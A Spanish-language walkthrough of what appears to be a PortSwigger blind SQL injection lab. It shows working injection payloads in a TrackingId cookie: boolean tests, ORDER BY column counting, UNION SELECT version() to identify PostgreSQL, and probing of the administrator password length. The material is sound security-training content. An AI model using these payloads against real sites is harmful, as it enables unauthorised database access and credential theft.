Tenemos el siguiente laboratorio:

Donde vemos que la respuesta esperable y normal es un welcome back:
![[Pasted image 20240518101727.png]]
Si interceptamos alguna petición, vemos que hay un TrackingId:
![[Pasted image 20240518101609.png]]
Si añadimos una comilla justo después de la cookie, vemos que ya no se muestra dicho mensaje de welcome:
![[Pasted image 20240518101821.png]]
Pero si insetamos el siguiente payload, ahora vuelve a mostrarse el mensaje de bienvenida:
```bash
TrackingId=AloAGb7uBq1Abq2U' AND 1=1-- -
```
![[Pasted image 20240518101915.png]]
Ahora vamos a identificar las columnas de la tabla, por lo que usamos primero ORDER BY:
```bash
TrackingId=AloAGb7uBq1Abq2U' ORDER BY 1-- -
```
![[Pasted image 20240518102423.png]]
Tras probar con ORDER BY 2, 3, 4 y 5, vemos que solo funciona con ORDER BY 1, por lo que tenemos una columna:
```bash
TrackingId=AloAGb7uBq1Abq2U' ORDER BY 1-- -
```
![[Pasted image 20240518102547.png]]
Ahora, para obtener más información, usaremos la siguiente chetseet:
```bash
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
![[Pasted image 20240518102703.png]]
Donde probamos el siguiente payload para comprobar ante qué base de datos tenemos, la cual se trata de una PostgreSQL:
```bash
TrackingId=AloAGb7uBq1Abq2U' UNION SELECT version()-- -
```
![[Pasted image 20240518102943.png]]
Ahora vamos a comprobar si el usuario administrador existe:
```bash
TrackingId=' UNION SELECT 'prueba' FROM users where username='administrator'-- -
```
![[Pasted image 20240518103628.png]]
Ahora vamos a ir comprobando la extensión de la contraseña con el siguiente payload:
```bash
TrackingId=' UNION SELECT 'test' FROM users where username='administrator' AND LENGTH(password) > 15-- -
```
![[Pasted image 20240518103924.png]]
En este punto, vamos probando hasta comprobar que la contraseña es igual a 20 caracteres:
```bash
TrackingId=' UNION SELECT 'test' FROM users where username='administrator' AND LENGTH(password) = 20-- -
```
![[Pasted image 20240518104021.png]]
